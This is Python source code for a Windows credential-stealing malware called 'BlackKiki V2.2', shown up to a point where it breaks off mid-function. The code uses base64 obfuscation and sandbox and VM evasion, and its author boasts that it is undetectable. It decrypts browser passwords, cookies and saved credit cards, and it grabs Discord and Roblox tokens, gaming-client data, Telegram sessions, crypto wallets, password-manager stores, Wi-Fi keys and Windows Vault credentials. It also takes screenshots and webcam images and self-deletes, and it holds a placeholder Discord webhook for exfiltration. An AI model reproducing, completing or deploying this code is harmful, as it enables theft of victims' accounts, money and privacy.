# Compile using:
# pyinstaller main.py --onefile --noconsole --clean --name BlackKiki --icon=icon.ico --hidden-import=pygame --hidden-import=pygame.camera --hidden-import=win32crypt --hidden-import=win32clipboard --hidden-import=win32api --hidden-import=winreg --hidden-import=win32security --hidden-import=win32file --hidden-import=win32process --hidden-import=win32event --hidden-import=psutil --hidden-import=Crypto.Cipher.AES --hidden-import=PIL --hidden-import=PIL.ImageGrab --collect-all pygame --collect-all PIL --noupx
# ------------------------------------------------
# BlackKiki V2.2
# ------------------------------------------------
# Changes:
# IMPORTANT -> Use the builder.py file for creation
# Added way more paths
# Readability is worse for skids (base64)
# Completely changed up patterns
# ------------------------------------------------
# fud btw <3
# ------------------------------------------------
# ------------------------------------------------
# ------------------------------------------------
import os,sys,json,base64,sqlite3,shutil,tempfile,zipfile,requests,platform,socket,getpass,datetime,subprocess,re,time,glob,ctypes,hashlib,threading,random,string,win32crypt,win32clipboard,winreg,psutil,win32api,win32net,win32gui,win32con,win32netcon,netifaces,uuid,pygame,pygame.camera,fontTools.ttLib
from Crypto.Cipher import AES
from PIL import ImageGrab
W = base64.b64decode("YOUR_BASE64_ENCODED_DISCORD_WEBHOOK").decode(errors="ignore")
P={base64.b64decode(k).decode():os.path.expandvars(base64.b64decode(v).decode())for k,v in{
    "Yw==":r"Jk9DQUxBUElEQVRBXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRh",
    "ZQ==":r"Jk9DQUxBUElEQVRBXE1pY3Jvc29mdFxFZGRnZVxVc2VyIERhdGE=",
    "Yg==":r"Jk9DQUxBUElEQVRBXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlcVxVc2VyIERhdGE=",
    "bw==":r"JkFQUElEQVRBXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZQ==",
    "dg==":r"Jk9DQUxBUElEQVRBXFZpdmFsZGlcVXNlciBEYXRh",
    "eQ==":r"Jk9DQUxBUElEQVRBXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YQ==",
    "Zw==":r"JkFQUElEQVRBXE9wZXJhIFNvZnR3YXJlXE9wZXJhIEdYIFN0YWJsZQ==",
    "Y2VudA==":r"Jk9DQUxBUElEQVRBXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==",
    "dW5nb29n":r"Jk9DQUxBUElEQVRBXFVub29nbGVkIENocm9taXVtXFVzZXIgRGF0YQ==",
    "Y29tb2Rv":r"Jk9DQUxBUElEQVRBXENvbW9kb1xEcmFnb25cVXNlciBEYXRh",
    "dG9yY2g=":r"Jk9DQUxBUElEQVRBXFRvcmNoXFVzZXIgRGF0YQ==",
    "bWF4dGhvbg==":r"Jk9DQUxBUElEQVRBXE1heHRob25cVXNlciBEYXRh",
    "YXZhc3Q=":r"Jk9DQUxBUElEQVRBXEF2YXN0IFNvZnR3YXJlXEJyb3dzZXJcVXNlciBEYXRh",
    "aXJvbg==":r"Jk9DQUxBUElEQVRBXFNSV2FyZSBJcm9uXFVzZXIgRGF0YQ=="
}.items()}
E=base64.b64decode("bmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdnbm5uYmZuYWVsbW9tZWltbGhwbWdqbmpvcGhocGtrb2xqcGFiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYWZuaG1raGhta2Jqa2thYm5kY25ub2dhZ29nYm5lZWNhZmJjYmplYmJmbmRncm5jZWttZ2tnZWppcGRla2FjbWFjb2RramJkd21vbGVlYm9sbWRqb25pbGtkYmNoaG5tcGNhZ3BwbG1wZm9qbWdnbm5naWxicm9qZGphbWVkbWthbWNrbm9na2dkZnhoaGJkZGNnaGFjaGtlamVhcG1rcGVnamtibGtrZWZhY2ZubWthamNqbWFiaWpobGNvYWZsa21mbmdncGhrZmdraGpwZWpkaGtjaGZobWtmYm1rcGZvcGtlbG1hcGNvaXBlbWZlbmRtZGNnaG5lZ2ltbg==").decode().split(",")
def rds():return''.join(random.choices(string.ascii_lowercase+string.digits,k=random.randint(5,9)))
def vmc():
    s=0
    vp=base64.b64decode("dmJveHNlcnZpY2Uvdm10b29sc2QvdmJveHRyYXkvdm13YXJldHJheS93aXJlc2hhcmsvb2xseWRiZy94MzJkYmcveDY0ZGJnL3Byb2Ntb24vcHJvY2V4cC9maWRkbGVyL2F1dG9ydW5zL3Byb2Nlc3NoYWNrZXIvaWRhNjQvZ2hpZHJhL3JhZGFyZTIvc2FuZGJveGllL2N1Y2tvby9hbnlkZXNrL3RlYW12aWV3ZXIvdmlydHVhbGJveC9xZW11L2h5cGVydi9wYXJhbGxlbHMvY2l0cml4L3JkcHdyYXAvYnVycHN1aXRlL2NoYXJsZXMvbWV0YXNwbG9pdC9uZXNzdXMvbm1hcA==").decode().split("/")
    for p in psutil.process_iter(['name']):
        try:
            if p.info['name'].lower() in vp:s+=3
        except:pass
    vp2=[base64.b64decode(x).decode() for x in["QzpcV2luZG93c1xzeXN0ZW0zMlxkcml2ZXJzXFZib3hNb3VzZS5zeXM=","QzpcV2luZG93c1xzeXN0ZW0zMlxkcml2ZXJzXFZtaGdmc3Muc3lz","QzpcUHJvZ3JhbSBGaWxlc1xPcmFjbGVcVmlydHVhbEJveCBHdWVzdCBBZGRpdGlvbnM=","QzpcUHJvZ3JhbSBGaWxlc1xWTXdhcmVcVk13YXJlIFRvb2xz","QzpcUHJvZ3JhbSBGaWxlc1xRRU1V","QzpcUHJvZ3JhbSBGaWxlc1xQYXJhbGxlbHNcUGFyYWxsZWxzIFRvb2xz","QzpcUHJvZ3JhbSBGaWxlc1xDaXRyaXhcSUNBIENsaWVudA=="]]
    for p in vp2:
        if os.path.exists(p):s+=2
    try:
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,base64.b64decode("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXERpc2tcRW51bQ==").decode())
        v,_=winreg.QueryValueEx(k,"0")
        winreg.CloseKey(k)
        if any(w in v.lower() for w in base64.b64decode("dmJveCx2bXdhcmUscXVlbSx2aXJ0dWFsLGh5cGVyLHBhcmFsbGVsLHhlbixrdm0=").decode().split(",")):s+=4
    except:pass
    if os.cpu_count() is not None and os.cpu_count()<=2:s+=2
    try:
        mem=ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(mem))
        if mem.value<4*1024*1024*1024:s+=2
    except:pass
    if any(w in x.lower() for x in [platform.machine(),platform.processor()] for w in base64.b64decode("dmlydHVhbCx2bXdhcmUseGVu").decode().split(",")):s+=3
    if len(psutil.net_connections())<5:s+=1
    return s>=9
def sd():
    if sys.platform!="win32":return
    try:
        p=sys.executable if getattr(sys,'frozen',False) else os.path.abspath(sys.argv[0])
        t=os.path.join(tempfile.gettempdir(),base64.b64decode("cm1f").decode()+rds()+".bat")
        with open(t,"w") as f:f.write(base64.b64decode("QGVjaG8gb2ZmCnRpbWVvdXQgL3QgNCA+bnVsCmRlbCAvZiAvcSAi").decode()+p+base64.b64decode("IiA+bnVsIDImPTEKZGVsICIlMH4wIiA+bnVsIDImPTE=").decode())
        subprocess.Popen(['cmd','/c',t],creationflags=subprocess.DETACHED_PROCESS|subprocess.CREATE_NO_WINDOW)
    except:pass
def kb():
    nms=[base64.b64decode(x).decode() for x in["Y2hyb21l","bXNlZGdl","YnJhdmU=","b3BlcmE=","dml2YWxkaQ==","eWFuZGV4LWJyb3dzZXI=","ZmlyZWZveA==","b3BlcmFfZ3g=","Y2VudGJy","dG9yY2g=","bWF4dGhvbg==","ZHJhZ29u","YXZhc3Ricm93c2Vy","aXJvbg==","ZXBpY2Jyb3dzZXI=","c2xlaXBuaXI=","d2F0ZXJmb3g=","cGFsZW1vb24="]]
    for n in nms:
        try:subprocess.run(f'taskkill /im {n}.exe /f >nul 2>&1',shell=True,timeout=random.uniform(2.5,4))
        except:pass
    time.sleep(random.uniform(0.3,0.7))
def gmk(p):
    try:
        with open(os.path.join(p,base64.b64decode("TG9jYWwgU3RhdGU=").decode()),"r",encoding="utf-8") as f:
            kd=json.load(f)[base64.b64decode("b3NfY3J5cHQ=").decode()][base64.b64decode("ZW5jcnlwdGVkX2tleQ==").decode()]
            k=base64.b64decode(kd)[5:]
        return win32crypt.CryptUnprotectData(k,None,None,None,0)[1]
    except:return b""
def dv(v,m):
    try:
        if len(v)<15:return ""
        iv=v[3:15]
        ct=v[15:-16]
        tg=v[-16:]
        return AES.new(m,AES.MODE_GCM,iv).decrypt_and_verify(ct,tg).decode(errors="replace")
    except:return ""
def cdb(s,t):
    time.sleep(random.uniform(0.05,0.15))
    try:
        if os.path.exists(s):shutil.copy2(s,t);return True
    except:pass
    return False
def sp(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ") or d.startswith("System Profile")]:
        db=os.path.join(r,pr,base64.b64decode("TG9naW4gRGF0YQ==").decode())
        tmp=os.path.join(o,f"{l}_{pr}_lgdb_{rds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute(base64.b64decode("U0VMRUNUIGFjdGlvbl91cmwsdXNlcm5hbWVfdmFsdWUscGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnM=").decode())
                lines=[f"{u}:::{usr}:::{dv(pw,m)}" for u,usr,pw in cur.fetchall() if dv(pw,m)]
                if lines:open(os.path.join(o,f"{l}_{pr}_lg.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except:pass
    time.sleep(random.uniform(0.2,0.4))
def sc(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        for p in [os.path.join(r,pr,"Network",base64.b64decode("Q29va2llcw==").decode()),os.path.join(r,pr,base64.b64decode("Q29va2llcw==").decode())]:
            if not os.path.exists(p):continue
            tmp=os.path.join(o,f"{l}_{pr}_ckdb_{rds()}.db")
            if cdb(p,tmp):
                try:
                    c=sqlite3.connect(tmp)
                    cur=c.cursor()
                    cur.execute(base64.b64decode("U0VMRUNUIGhvc3Rfa2V5LG5hbWUsZW5jcnlwdGVkX3ZhbHVlIEZST00gY29va2llcw==").decode())
                    lines=[f"{h}:::{na}:::{dv(ev,m)}" for h,na,ev in cur.fetchall() if dv(ev,m)]
                    if lines:open(os.path.join(o,f"{l}_{pr}_ck.txt"),"w",encoding="utf-8").write("\n".join(lines))
                except:pass
def saf(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,base64.b64decode("V2ViIERhdGE=").decode())
        tmp=os.path.join(o,f"{l}_{pr}_afdb_{rds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute(base64.b64decode("U0VMRUNUIG5hbWUsdmFsdWUgRlJPTSBhdXRvZmlsbA==").decode())
                lines=[f"{n}:::{v}" for n,v in cur.fetchall() if v]
                if lines:open(os.path.join(o,f"{l}_{pr}_af.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except:pass
def scc(r,m,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,base64.b64decode("V2ViIERhdGE=").decode())
        tmp=os.path.join(o,f"{l}_{pr}_ccdb_{rds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute(base64.b64decode("U0VMRUNUIG5hbWVfb25fY2FyZCxleHBpcmF0aW9uX21vbnRoLGV4cGlyYXRpb25feWVhcixjYXJkX251bWJlcl9lbmNyeXB0ZWQgRlJPTSBjcmVkaXRfY2FyZHM=").decode())
                lines=[f"{n}:::{m}/{y}:::{dv(e,m)}" for n,m,y,e in cur.fetchall() if dv(e,m)]
                if lines:open(os.path.join(o,f"{l}_{pr}_cc.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except:pass
def sh(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_hsdb_{rds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT url,title,visit_time FROM urls ORDER BY visit_time DESC LIMIT 500")
                lines=[f"{u}:::{ti}:::{vt}" for u,ti,vt in cur.fetchall()]
                if lines:open(os.path.join(o,f"{l}_{pr}_hs.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except:pass
def sdw(r,o,l):
    for pr in ["Default"]+[d for d in os.listdir(r) if d.startswith("Profile ") or d.startswith("Person ")]:
        db=os.path.join(r,pr,"History")
        tmp=os.path.join(o,f"{l}_{pr}_dwdb_{rds()}.db")
        if cdb(db,tmp):
            try:
                c=sqlite3.connect(tmp)
                cur=c.cursor()
                cur.execute("SELECT target_path,tab_url FROM downloads ORDER BY start_time DESC LIMIT 200")
                lines=[f"{tp}:::{tu}" for tp,tu in cur.fetchall()]
                if lines:open(os.path.join(o,f"{l}_{pr}_dw.txt"),"w",encoding="utf-8").write("\n".join(lines))
            except:pass
def sdt(o):
    paths=[os.path.join(os.getenv("APPDATA"),a,"Local Storage","leveldb") for a in ["discord","discordcanary","discordptb","lightcord","betterdiscord"]]
    for br in P.values():
        if os.path.exists(br):paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=base64.b64decode("W1x3LV17MjR9XFxbXHctXXs2fVxcW1x3LV17Mjd9LF0=").decode()
    mfa_rx=base64.b64decode("bWZhXFxbXHctXXs4NH0=").decode()
    for p in paths:
        if not os.path.exists(p):continue
        for ext in [".log",".ldb",".dat"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        content=ff.read()
                        for x in re.findall(rx,content):t.add(x)
                        for y in re.findall(mfa_rx,content):t.add(y)
                except:pass
    if t:open(os.path.join(o,base64.b64decode("ZHRrXyI=").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(t))
def srt(o):
    paths=[os.path.join(os.getenv("LOCALAPPDATA"),a,"Local Storage","leveldb") for a in ["roblox","robloxstudio"]]
    for br in P.values():
        if os.path.exists(br):paths.append(os.path.join(br,"Default","Local Storage","leveldb"))
    t=set()
    rx=base64.b64decode("W1x3LV17NjQsfQ==").decode()
    for p in paths:
        if not os.path.exists(p):continue
        for ext in [".log",".ldb",".json"]:
            for f in glob.glob(os.path.join(p,f"*{ext}")):
                try:
                    with open(f,errors="ignore") as ff:
                        content=ff.read()
                        if base64.b64decode("LlJPQkxPU0VDVVJJVFk=").decode() in content or base64.b64decode("cm9ibG94").decode() in content.lower():
                            for x in re.findall(rx,content):t.add(x)
                except:pass
    rb=os.path.join(os.getenv("APPDATA"),"Roblox")
    if os.path.exists(rb):
        try:
            for f in glob.glob(os.path.join(rb,"**","*.json"),recursive=True):
                with open(f,"r",errors="ignore") as ff:
                    data=json.load(ff)
                    if "auth" in data or "token" in data:t.add(json.dumps(data))
        except:pass
    if t:open(os.path.join(o,base64.b64decode("cnRrXyI=").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(t))
def sst(o):
    s=os.path.expandvars(r"%PROGRAMFILES(x86)%\Steam")
    if os.path.exists(s):
        try:shutil.copytree(s,os.path.join(o,base64.b64decode("c3R4XyI=").decode()+rds()),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.log","*.dmp"))
        except:pass
def sep(o):
    e=os.path.expandvars(r"%PROGRAMDATA%\Epic")
    if os.path.exists(e):
        try:shutil.copytree(e,os.path.join(o,base64.b64decode("ZXB4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
def sbn(o):
    b=os.path.expandvars(r"%PROGRAMDATA%\Battle.net")
    if os.path.exists(b):
        try:shutil.copytree(b,os.path.join(o,base64.b64decode("Ym54XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
def sri(o):
    ri=os.path.expandvars(r"%PROGRAMDATA%\Riot Games")
    if os.path.exists(ri):
        try:shutil.copytree(ri,os.path.join(o,base64.b64decode("cml4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
def stg(o):
    t=os.path.join(os.getenv("APPDATA"),"Telegram Desktop","tdata")
    if os.path.exists(t):
        try:shutil.copytree(t,os.path.join(o,base64.b64decode("dGd4XyI=").decode()+rds()),dirs_exist_ok=True,ignore=shutil.ignore_patterns("*.lock","cache*"))
        except:pass
def sw(o):
    wd=os.path.join(o,base64.b64decode("dnhf").decode()+rds())
    os.makedirs(wd,exist_ok=True)
    for ext in E:
        for br in P.values():
            if not os.path.exists(br):continue
            ep=os.path.join(br,"Default","Local Extension Settings",ext)
            if os.path.exists(ep):
                try:shutil.copytree(ep,os.path.join(wd,ext[:8]+"_"+rds()),dirs_exist_ok=True)
                except:pass
    dw={base64.b64decode(k).decode():os.path.expandvars(base64.b64decode(v).decode())for k,v in{
        "ZXhvZHVz":r"JkFQUElEQVRBXEV4b2R1cw==",
        "YXRvbWlj":r"JkFQUElEQVRBXFV0b21pYw==",
        "ZWxlY3RydW0=":r"JkFQUElEQVRBXEVsZWN0cnVtXFdhbGxldHM=",
        "Y29pbm9taQ==":r"JkFQUElEQVRBXENvaW5vbWk=",
        "Z3VhcmRh":r"JkFQUElEQVRBXEd1YXJkYQ==",
        "bGVkZ2Vy":r"JkFQUElEQVRBXExlZGdlciBMaXZl",
        "dHJlem9y":r"JkFQUElEQVRBXFRyZXpvciBTdWl0ZQ==",
        "d2FzYWJp":r"JkFQUElEQVRBXFdhdGNoV2FzYWJp",
        "bXltb25lcm8=":r"JkFQUElEQVRBXE15TW9uZXJv",
        "emVuZ28=":r"JkFQUElEQVRBXFpvbmdv",
        "Ymx1ZXdhbGxldA==":r"JkFQUElEQVRBXEJsdWVXYWxsZXQ=",
        "c3BhcnJvdw==":r"JkFQUElEQVRBXFNwYXJyb3c=",
        "YXJnZW50":r"JkFQUElEQVRBXEFyZ2VudA==",
        "bmlmdHk=":r"JkFQUElEQVRBXE5pZnR5IFdhbGxldA==",
        "bGlxdWFsaXR5":r"JkFQUElEQVRBXExpcXVhbGl0eQ==",
        "eGRlZmk=":r"JkFQUElEQVRBXFhEZUZp",
        "YW1iaXJl":r"JkFQUElEQVRBXEFtYmlyZQ==",
        "dG9rZW5wb2NrZXQ=":r"JkFQUElEQVRBXFRva2VuUG9ja2V0"
    }.items()}
    for n,p in dw.items():
        if os.path.exists(p):
            try:shutil.copytree(p,os.path.join(wd,n+"_"+rds()),dirs_exist_ok=True)
            except:pass
    pm={base64.b64decode(k).decode():os.path.expandvars(base64.b64decode(v).decode())for k,v in{
        "Yml0d2FyZGVu":r"JkFQUElEQVRBXEJpdHdhcmRlbgo=",
        "MXBhc3N3b3Jk":r"JkFQUElEQVRBXFx1cGFzc3dvcmQ=",
        "a2VlcGFzcw==":r"JkFQUElEQVRBXEtlZVBhc3M=",
        "bGFzdHBhc3M=":r"JkFQUElEQVRBXExhc3RQYXNz",
        "bm9yZHBhc3M=":r"JkFQUElEQVRBXE5vcmQgU2VjdXJpdHlcTm9yZFBhc3M=",
        "ZGFzaGxhbmU=":r"JkFQUElEQVRBXERhc2hsYW5l",
        "cm9ib2Zvcm0=":r"JkFQUElEQVRBXFNpYmVyIFN5c3RlbXNcUm9ib0Zvcm0=",
        "YXV0aHk=":r"Jk9DQUxBUElEQVRBXEF1dGh5",
        "c2lnbmFs":r"JkFQUElEQVRBXFNpZ25hbA==",
        "d2hhdHNhcHA=":r"Jk9DQUxBUElEQVRBXFdoYXRzQXBw",
        "ZWxlbWVudA==":r"JkFQUElEQVRBXEVsbWVudA==",
        "c2Vzc2lvbg==":r"JkFQUElEQVRBXFNlc3Npb24=",
        "Yml0cGF5":r"JkFQUElEQVRBXEJpdFBheQ==",
        "bXljZWxpdW0=":r"JkFQUElEQVRBXE15Y2VsaXVt",
        "c2Ftb3VyYWk=":r"JkFQUElEQVRBXFNhbW91cmFpIFdhbGxldA=="
    }.items()}
    for n,p in pm.items():
        if os.path.exists(p):
            try:shutil.copytree(p,os.path.join(wd,base64.b64decode("cG14XyI=").decode()+n+"_"+rds()),dirs_exist_ok=True)
            except:pass
def sia(o):
    try:
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,base64.b64decode("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs").decode())
        apps=[]
        i=0
        while True:
            try:
                sub=winreg.EnumKey(k,i)
                sk=winreg.OpenKey(k,sub)
                try:
                    name=winreg.QueryValueEx(sk,base64.b64decode("RGlzcGxheU5hbWU=").decode())[0]
                    vers=winreg.QueryValueEx(sk,base64.b64decode("RGlzcGxheVZlcnNpb24=").decode())[0]
                    inst=winreg.QueryValueEx(sk,base64.b64decode("SW5zdGFsbExvY2F0aW9u").decode())[0]
                    apps.append(f"{name}:::{vers}:::{inst}")
                except:pass
                winreg.CloseKey(sk)
                i+=1
            except:break
        winreg.CloseKey(k)
        if apps:open(os.path.join(o,base64.b64decode("c2xf").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(sorted(set(apps))))
    except:pass
def spr(o):
    try:
        procs=[]
        for p in psutil.process_iter(['name','pid','username','cpu_percent','memory_percent','exe']):
            try:procs.append(f"{p.info['name']}:::{p.info['pid']}:::{p.info['username']}:::{p.info['cpu_percent']}:::{p.info['memory_percent']}:::{p.info['exe']}")
            except:pass
        if procs:open(os.path.join(o,base64.b64decode("cGRf").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(procs))
    except:pass
def ssi(o):
    try:ip=requests.get(base64.b64decode("aHR0cHM6Ly9hcGkuaXBpZnkub3Jn").decode(),timeout=5).text
    except:ip="x"
    macs=[]
    for iface in netifaces.interfaces():
        addrs=netifaces.ifaddresses(iface).get(netifaces.AF_LINK)
        if addrs:macs.append(addrs[0]['addr'])
    fonts_count=len(glob.glob(base64.b64decode("QzpcV2luZG93c1xGb250c1wqLnR0Zg==").decode()))+len(glob.glob(base64.b64decode("QzpcV2luZG93c1xGb250c1wqLm90Zg==").decode()))+len(glob.glob(os.path.expandvars(base64.b64decode("JUxPQ0FMQVBQREFUQVNcTWljcm9zb2Z0XFdpbmRvd3NcRm9udHNcKi50dGY=").decode())))
    av_procs=[p.info['name'] for p in psutil.process_iter(['name']) if any(av in p.info['name'].lower() for av in base64.b64decode("bXNtcGVuZyxhdmFzdCxhdmcsYml0ZGVmZW5kZXIsa2FzcGVyc2t5LG1jYWZlZSxub3J0b24sc29waG9zLHN5bWFudGVjLHRyZW5kbWljcm8sd2luZG93c2RlZmVuZGVyLG1hbHdhcmVieXRlcyxlc2V0LGF2aXJhLHdlYnJvb3QscGFuZGEsZi1zZWN1cmUsdmlwcmUsY29tb2RvLGN5bGFuY2UsY3Jvd2RzdHJpa2U=").decode().split(","))]
    net_adapters=[netifaces.ifaddresses(iface) for iface in netifaces.interfaces()]
    usb=[d.device for d in psutil.disk_partitions() if 'removable' in d.opts]
    battery=psutil.sensors_battery()
    batt=f"{battery.percent}%::{battery.power_plugged}" if battery else base64.b64decode("bm9iYXR0").decode()
    tz=time.tzname[time.daylight]
    lang=winreg.QueryValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER,base64.b64decode("Q29udHJvbCBQYW5lbFxJbnRlcm5hdGlvbmFs").decode()),"LocaleName")[0]
    drivers=[]
    try:
        k=winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,base64.b64decode("U1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2Vz").decode())
        i=0
        while True:
            drivers.append(winreg.EnumKey(k,i))
            i+=1
    except:pass
    event_logs=glob.glob(base64.b64decode("QzpcV2luZG93c1xTeXN0ZW0zMlx3aW5ldnRcTG9nc1wqLmV2dHg=").decode())[:30]
    info=[
        base64.b64decode("dXNyOg==").decode()+getpass.getuser(),
        base64.b64decode("aHN0Og==").decode()+socket.gethostname(),
        base64.b64decode("aXA6").decode()+ip,
        base64.b64decode("b3M6").decode()+platform.platform(),
        base64.b64decode("cmVsOg==").decode()+platform.release(),
        base64.b64decode("dmVyOg==").decode()+platform.version(),
        base64.b64decode("YXJjaDo=").decode()+platform.machine(),
        base64.b64decode("Y3B1Og==").decode()+platform.processor(),
        base64.b64decode("Y29yZXM6").decode()+str(os.cpu_count()),
        base64.b64decode("cmFtOg==").decode()+str(psutil.virtual_memory().total//(1024**3))+"GB",
        base64.b64decode("Z3B1Og==").decode()+f"{win32api.GetSystemMetrics(0)}x{win32api.GetSystemMetrics(1)}",
        base64.b64decode("ZHNrOg==").decode()+str([d.mountpoint for d in psutil.disk_partitions()]),
        base64.b64decode("bWFjOg==").decode()+';'.join(macs),
        base64.b64decode("Zm9udHM6").decode()+str(fonts_count),
        base64.b64decode("YXY6").decode()+';'.join(av_procs),
        base64.b64decode("bmV0YWRwOg==").decode()+str(net_adapters),
        base64.b64decode("dXNiOg==").decode()+';'.join(usb),
        base64.b64decode("YmF0dDo=").decode()+batt,
        base64.b64decode("dHo6").decode()+tz,
        base64.b64decode("bGFuZzo=").decode()+lang,
        base64.b64decode("ZHJ2Og==").decode()+';'.join(drivers[:60]),
        base64.b64decode("ZXZ0bG9nOg==").decode()+';'.join(event_logs),
        base64.b64decode("dG06").decode()+str(datetime.datetime.now()),
        base64.b64decode("dWlkOg==").decode()+str(uuid.uuid4())
    ]
    open(os.path.join(o,base64.b64decode("ZGlf").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(info))
def ss(o):
    try:ImageGrab.grab().save(os.path.join(o,base64.b64decode("dmNhcF8=").decode()+rds()+".png"))
    except:pass
def swc(o):
    try:
        pygame.camera.init()
        cams=pygame.camera.list_cameras()
        if cams:
            cam=pygame.camera.Camera(cams[0],(800,600))
            cam.start()
            time.sleep(0.5)
            img=cam.get_image()
            pygame.image.save(img,os.path.join(o,base64.b64decode("dmNhbV8=").decode()+rds()+".jpg"))
            cam.stop()
    except:pass
def clb():
    try:
        win32clipboard.OpenClipboard()
        data=win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return str(data)
    except:return ""
def swf(o):
    try:
        outp=subprocess.check_output(base64.b64decode("bmV0c2ggd2xhbiBzaG93IHByb2ZpbGVz").decode(),shell=True).decode(errors="ignore")
        profiles=[line.split(":")[1].strip() for line in outp.split("\n") if base64.b64decode("QWxsIFVzZXIgUHJvZmlsZQ==").decode() in line]
        res=[]
        for pr in profiles:
            try:
                cmd=base64.b64decode("bmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0i").decode()+pr+base64.b64decode("IiBrZXk9Y2xlYXI=").decode()
                out=subprocess.check_output(cmd,shell=True).decode(errors="ignore")
                for line in out.split("\n"):
                    if base64.b64decode("S2V5IENvbnRlbnQ=").decode() in line:res.append(f"{pr}:::{line.split(':')[1].strip()}")
                    if base64.b64decode("U1NJRCBuYW1l").decode() in line:res.append(f"{line.strip()}")
            except:pass
        if res:open(os.path.join(o,base64.b64decode("bmNf").decode()+rds()+".txt"),"w",encoding="utf-8").write("\n".join(res))
    except:pass
def scrd(o):
    try:
        subprocess.run(base64.b64decode("dmF1bHRjbWQgL2xpc3RjcmVkczoiV2luZG93cyBDcmVkZW50aWFscyIgL2FsbCA+IGN2LnR4dA==").decode(),shell=True)
        shutil.move("cv.txt",os.path.join(o,base64.b64decode("Y3ZhdWx0XyI=").decode()+rds()+".txt"))
    except:pass
    try:
        subprocess.run(base64.b64decode("dmF1bHRjbWQgL2xpc3RjcmVkczoiV2ViIENyZWRlbnRpYWxzIiAvYWxsID4gd3YudHh0").decode(),shell=True)
        shutil.move("wv.txt",os.path.join(o,base64.b64decode("d3ZhdWx0XyI=").decode()+rds()+".txt"))
    except:pass
def spsh(o):
    psh=os.path.join(os.getenv("APPDATA"),base64.b64decode("TWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMbGluZVxDb25zb2xlSG9zdF9oaXN0b3J5LnR4dA==").decode())
    if os.path.exists(psh):
        try:shutil.copy2(psh,os.path.join(o,base64.b64decode("cGNoXyI=").decode()+rds()+".txt"))
        except:pass
    vsh=os.path.join(os.getenv("APPDATA"),base64.b64decode("TWljcm9zb2Z0XFdpbmRvd3NcUG93ZXJTaGVsbFxQU1JlYWRMbGluZVxWaXN1YWwgU3R1ZGlvIENvZGUgSG9zdF9oaXN0b3J5LnR4dA==").decode())
    if os.path.exists(vsh):
        try:shutil.copy2(vsh,os.path.join(o,base64.b64decode("dmNoXyI=").decode()+rds()+".txt"))
        except:pass
def srf(o):
    rec=os.path.join(os.getenv("APPDATA"),base64.b64decode("TWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50").decode())
    if os.path.exists(rec):
        try:shutil.copytree(rec,os.path.join(o,base64.b64decode("cmZ4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
    jmp=os.path.join(os.getenv("APPDATA"),base64.b64decode("TWljcm9zb2Z0XFdpbmRvd3NcUmVjZW50XEF1dG9tYXRpY0Rlc3RpbmF0aW9ucw==").decode())
    if os.path.exists(jmp):
        try:shutil.copytree(jmp,os.path.join(o,base64.b64decode("anB4XyI=").decode()+rds()),dirs_exist_ok=True)
        except:pass
def sua(o):
    uas=[]
    for br in P.values():
        if not os.path.exists(br):continue
        for pr in ["Default"]+[d for d in os.listdir(br) if d.startswith("Profile ")]:
            prefs=os.path.join(br,pr,base64.b64decode("UHJlZmVyZW5jZXM=").decode())
            if os.path.exists(prefs):
                try:
                    with open(prefs,"r",encoding="utf-8") as f:
                        data=json.load(f)
